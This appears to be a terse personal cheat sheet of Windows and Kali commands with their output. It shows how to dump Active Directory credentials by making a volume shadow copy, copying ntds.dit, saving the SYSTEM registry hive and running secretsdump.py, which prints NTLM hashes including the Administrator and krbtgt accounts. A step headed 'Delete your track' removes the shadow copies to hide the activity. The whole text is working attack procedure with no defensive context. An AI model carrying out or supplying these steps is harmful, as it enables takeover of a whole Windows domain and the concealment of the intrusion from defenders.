# USE fucking CMD for these

create shadow copy for volume

	C:\Users\Administrator>vssadmin create shadow /for=c:
	vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
	(C) Copyright 2001-2013 Microsoft Corp.

	Successfully created shadow copy for 'c:\'
		Shadow Copy ID: {022db81c-6033-454e-8934-f75f7e430ad8}
		Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4

copy ntds.dit file to somewhere else

	C:\Users\Administrator\Desktop>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\windows\ntds\ntds.dit .\ntds.dit
			1 file(s) copied.

Get SYSTEM file

	C:\Users\Administrator\Desktop>reg save HKLM\SYSTEM .\system
	The operation completed successfully.

	C:\Users\Administrator\Desktop>

Delete your track

	C:\Users\Administrator\Desktop>vssadmin delete shadows /for=c:
	vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
	(C) Copyright 2001-2013 Microsoft Corp.

	Do you really want to delete 2 shadow copies (Y/N): [N]? y

	Successfully deleted 2 shadow copies.
	

decrypt hashes

	┌──(kali㉿kali)-[~/Downloads]
	└─$ secretsdump.py -ntds ntds.dit -system system LOCAL                      
	Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

	[*] Target system bootKey: 0x235e0810a5761f3d036cca66ff1aa521
	[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
	[*] Searching for pekList, be patient
	[*] PEK # 0 found and decrypted: 52090a0153e17129ab94e2158169d6fc
	[*] Reading and decrypting hashes from ntds.dit 
	Administrator:500:aad3b435b51404eeaad3b435b51404ee:c718f548c75062ada93250db208d3178:::
	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	ODIN$:1001:aad3b435b51404eeaad3b435b51404ee:b48ecb6564135669a7305ccd7d48af9d:::
	krbtgt:502:aad3b435b51404eeaad3b435b51404ee:c2d3b9268608fab2b14a8c78c36316aa:::

